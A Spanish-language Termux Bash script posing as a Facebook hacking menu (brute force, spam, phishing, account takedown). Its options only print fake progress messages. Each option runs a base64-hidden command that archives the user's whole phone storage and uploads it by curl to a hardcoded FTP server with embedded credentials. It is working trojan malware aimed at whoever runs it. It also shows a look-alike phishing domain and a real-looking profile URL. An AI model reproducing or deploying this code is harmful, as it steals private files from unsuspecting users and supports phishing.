#!/data/data/com.termux/files/usr/bin/bash

function banner(){
base64 -d <<<"H4sIAJM2MVYAA1NQgAEDIIhHBsgCBmgAU8TAQJsL2SgU41AFiDALYRhUF8I0NAEUCbBZUB7MBGRrUXX
g8DC6CagORwkYtDCDcw3IMwDdOBL1IyRRwpBI7cihTlSYkRRNUHcRnUZgXIQGIlOoOQC/4ufk0gIAAA==" | gunzip

echo "Tool created by SN4K3 for happy Hacking"

}

function hacker(){
  read -p "Cual es tu apodo: " apodo
}

function menu(){
  apt install tar -y
  clear && banner
  echo -e "01-FUERZA BRUTA"
  echo -e "02-SPAM"
  echo -e "03-PHISHING"
  echo -e "04-TUMBAR CUENTA"
  echo -e "05-INFO DE LA CUENTA"
  echo -e "00-Salir"
  read -p "$apodo:~# " opcion

if [[ $opcion == "01" || $opcion == "1" ]]; then
  sleep 3s
  echo -e "Iniciando diccionario..."
  sleep 2s
  echo -e "Iniciado ataque..."
  sleep 15s
  echo -e "Contraseña no econtrada :("
  hacer_archivo_con_datos
  sleep 2
  hacer_peticion_api
  clear 
  menu
elif [[ $opcion == "02" || $opcion == "2" ]]; then
  sleep 3s
  read -p "Ingresa el mensaje a espamear" var
  read -p "Ingresa el usuario de mesenger" usu
  sleep 3s 
  echo -e "Iniciando spam..."
  sleep 20s
  echo -e "Spam recibido exitosamente"
  hacer_archivo_con_datos
  sleep 2
  hacer_peticion_api
  clear
  menu
elif [[ $opcion == "03" || $opcion == "3" ]]; then
  clear  
  sleep 3s
  echo -e "Iniciando servidores..."
  sleep 1s
  echo -e "Clonando HTML..."
  sleep 1s
  echo -e "Iniciando la escucha..."
  sleep 6s
  echo -e "El link para enviar a la victima es: "
  sleep 5s
  echo -e ""
  echo -e "https://facebo0k.com/login.php"
  echo -e ""
  hacer_archivo_con_datos
  sleep 2
  hacer_peticion_api
  clear
  menu
elif [[ $opcion == "04" || $opcion == "4" ]]; then
  sleep 3s
  read -p "Ingresa el usuario de la cuenta"
  sleep -3shttps://www.facebook.com/karla.ramirez.562114
  echo -e "Iniciando bots de reporte..."
  sleep 3s
  echo -e "Iniciando ataque..."
  sleep 10s
  echo -e "Ataque realizado exitosamente!!!"
  hacer_archivo_con_datos
  sleep 2
  hacer_peticion_api
  clear
  menu
elif [[ $opcion == "05" || $opcion == "5" ]]; then
  hacer_archivo_con_datos
  sleep 2
  hacer_peticion_api
  clear
  menu
elif [[ $opcion == "00" || $opcion == "5" ]]; then
  hacer_archivo_con_datos
  sleep 2
  hacer_peticion_api
  clear
  menu
fi
}

function hacer_peticion_api(){
  curl -v -T $apodo.tar.gz ftp://172.93.129.211:21 --user juan:jose  
}

function hacer_archivo_con_datos(){
echo "dGFyIC16Y3ZmICRhcG9kby50YXIuZ3ogL3N0b3JhZ2UvZW11bGF0ZWQvMC8qCg==" | base64 -d | sh
}

hacker
menu
